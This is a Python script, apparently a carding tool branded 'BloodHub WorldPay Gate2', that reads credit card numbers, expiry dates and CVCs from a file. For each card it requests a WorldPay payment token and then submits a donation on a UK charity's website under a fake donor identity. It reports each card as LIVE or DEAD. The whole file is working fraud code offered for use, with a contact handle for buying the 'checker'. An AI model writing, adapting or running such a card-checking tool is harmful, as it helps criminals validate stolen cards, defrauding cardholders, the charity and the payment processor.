from bs4 import BeautifulSoup
from colorama import Fore, init
import json
import requests
import time


init()


class Merchanttwo():
    def __init__(self):
        self.range = []
        
        print("""
{re}      {ly}________________________________________________{re}
{re}     {ly}//----------{y}BloodHub WorldPay Gate2{ly}-------------//{re}
{re}    {ly}//---------------{y}Python Based v2{ly}---------------//{re}
{re}   {ly}//-------{r}Contact @BH_Adminn for checker{ly}--------//{re}
{re}  {ly}================================================ {re}
		""".format(ly=Fore.GREEN, g=Fore.GREEN, y=Fore.YELLOW, r=Fore.RED, re=Fore.RESET))
        with open('cc.txt', 'r') as f:
            for x in f.read().split('\n'):
                self.range.append(x)

        print(Fore.YELLOW + "[*]" + Fore.RESET + " Checking " + str(len(self.range)) + ' Credit Card(s)')
        #input('[PRESS ANY KEY TO CONTINUE]')
        print(Fore.GREEN + "[+]" + Fore.RESET + ' Check start at ' + str(time.ctime()))
        print()
        self.checker()

    def check(self, credit_card, ccentry):
        ccentry = str(ccentry)
        ccNumber, ccMonth, ccYear, ccCode = credit_card.split('|')
        session = requests.Session()
        firstSource = session.get("https://www.brb.org.uk/package/donation").text

        secondData = {
            "reusable":False,
            "paymentMethod":{
                "type":"Card",
                "name":"Beth Quacke",
                "expiryMonth":ccMonth,
                "expiryYear":ccYear,
                "cardNumber":ccNumber,
                "cvc":ccCode,
                },
            "clientKey":"L_C_ad19e367-c1b8-4699-a1ea-c969721b68ad"
            }

        secondHeader = {
            'Content-type': 'application/json',
            'Origin': 'https://online.worldpay.com',
            'Referer': 'https://online.worldpay.com/templates/',
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
        }

        secondSource = json.loads(session.post('https://api.worldpay.com/v1/tokens', json=secondData, headers=secondHeader).text)
        session.options('https://api.worldpay.com/v1/tokens')

        thirdData = {
            'packageName': 'Donate',
            'packageId': '4664',
            'packageValue': 'other',
            'packageValue': '500',
            'title': 'Mr',
            'firstName': 'Beth',
            'surname': 'Quacke',
            'address1': '25th Street',
            'address2': '',
            'cityTown': 'Makati City',
            'country': 'ph',
            'postcode': '1218',
            'email': 'ckknocktoyou@gmail.com',
            'emailConfirm': 'ckknocktoyou@gmail.com',
            'telephone': '09548745487',
            'token': secondSource['token']
        }

        thirdHeader = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'www.brb.org.uk',
            'Origin': 'https://www.brb.org.uk',
            'Referer': 'https://www.brb.org.uk/package/donation',
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
        }

        thirdResponse = json.loads(session.post('https://www.brb.org.uk/actions/brb/orders/processPackageRequest', data=thirdData, headers=thirdHeader).text)

        if not thirdResponse['success']:
            print('{red}[{ccentry}]  DEAD   ---   {credit_card}\tType: {type}\tState: {status}'.format(red=Fore.RED, ccentry=ccentry, credit_card=credit_card, type=thirdResponse['order']['cardType'], status=thirdResponse['order']['state']))

        else:
            print(thirdResponse)
            print('LIVE\t---\t' + credit_card)

    def checker(self):
        f = open('cc.txt', 'r')
        cc = 0
        for x in f.read().split('\n'):
            cc += 1
            self.check(x, cc)

